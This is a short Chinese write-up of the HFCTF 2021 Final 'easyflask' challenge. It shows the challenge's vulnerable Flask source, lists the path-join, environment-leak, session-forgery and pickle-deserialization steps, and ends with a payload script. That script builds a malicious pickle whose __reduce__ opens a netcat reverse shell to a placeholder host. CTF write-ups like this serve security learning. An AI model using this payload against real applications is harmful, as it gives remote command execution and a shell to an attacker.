# 原创
：  HFCTF-2021-Final-easyflask

# HFCTF-2021-Final-easyflask

#### HFCTF-2021-Final-easyflask

## 考点

> 
Python os.path.join trick、环境变量暴露敏感信息、pickle 反序列化 RCE、Flask Session 伪造


## 思路

> 



> 



> 



## Payload

> 
/app/source源码信息


```
#!/usr/bin/python3.6
import os
import pickle

from base64 import b64decode
from flask import Flask, request, render_template, session

app = Flask(__name__)
app.config["SECRET_KEY"] = "*******"

User = type('User', (object,), {
    'uname': 'test',
    'is_admin': 0,
    '__repr__': lambda o: o.uname,
})


@app.route('/', methods=('GET',))
def index_handler():
    if not session.get('u'):
        u = pickle.dumps(User())
        session['u'] = u
    return "/file?file=index.js"


@app.route('/file', methods=('GET',))
def file_handler():
    path = request.args.get('file')
    path = os.path.join('static', path)
    if not os.path.exists(path) or os.path.isdir(path) \
            or '.py' in path or '.sh' in path or '..' in path or "flag" in path:
        return 'disallowed'

    with open(path, 'r') as fp:
        content = fp.read()
    return content


@app.route('/admin', methods=('GET',))
def admin_handler():
    try:
        u = session.get('u')
        if isinstance(u, dict):
            u = b64decode(u.get('b'))
        u = pickle.loads(u)
    except Exception:
        return 'uhh?'

    if u.is_admin == 1:
        return 'welcome, admin'
    else:
        return 'who are you?'


if __name__ == '__main__':
    app.run('0.0.0.0', port=80, debug=False)

```

> 
/proc/self/environ内容


> 
Payload构造


```
import pickle
from base64 import b64encode
import os

User = type('User', (object,), {
    'uname': 'test',
    'is_admin': 1,
    '__repr__': lambda o: o.uname,
    '__reduce__': lambda o: (eval, ("__import__('os').system('nc ip port -e /bin/sh')",))

})
u = pickle.dumps(User())
print(b64encode(u).decode())

```
